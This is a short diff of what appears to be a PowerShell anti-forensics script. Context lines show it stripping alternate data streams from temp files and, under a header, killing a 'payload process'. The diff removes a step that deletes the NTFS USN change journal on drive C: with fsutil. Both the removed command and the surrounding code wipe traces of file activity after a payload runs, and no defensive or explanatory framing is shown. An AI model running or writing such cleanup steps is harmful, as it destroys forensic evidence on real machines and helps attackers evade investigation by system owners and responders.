@@ -131,11 +131,6 @@ Get-ChildItem -Path C:\Windows\Temp, $env:LOCALAPPDATA\Temp -Recurse -File -Forc
 }
 Write-Host "[+] ADS removed from temp files." -ForegroundColor Green
 
-Write-Host "[*] Deleting USN Journal on C:..." -ForegroundColor Cyan
-fsutil usn deletejournal /d C: 2>$null
-Write-Host "[+] USN Journal deleted." -ForegroundColor Green
-
-
 # ------------------------------------------------------------
 # WAIT 10 SECONDS, THEN KILL PAYLOAD PROCESS
 # ------------------------------------------------------------
